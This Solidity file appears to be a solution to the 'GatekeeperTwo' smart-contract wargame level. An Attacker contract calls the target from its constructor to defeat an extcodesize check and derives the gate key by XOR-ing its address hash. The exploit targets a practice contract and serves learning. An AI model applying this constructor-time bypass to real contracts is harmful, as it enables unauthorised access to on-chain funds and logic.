// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperTwo.sol";
import "forge-std/console.sol";
contract Attacker {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        attack();
    }

    function generateGateKey(address _address) public pure returns (uint64) {
        uint64 hashPart = uint64(bytes8(keccak256(abi.encodePacked(_address))));
        return hashPart ^ type(uint64).max;
    }

    function attack() public {
        bytes8 gateKey = bytes8(generateGateKey(address(this)));
        (bool success) = gatekeeperTwo.enter(gateKey);
        console.log("enter complete : " , success);
        require(success, "Attack failed");
    }
}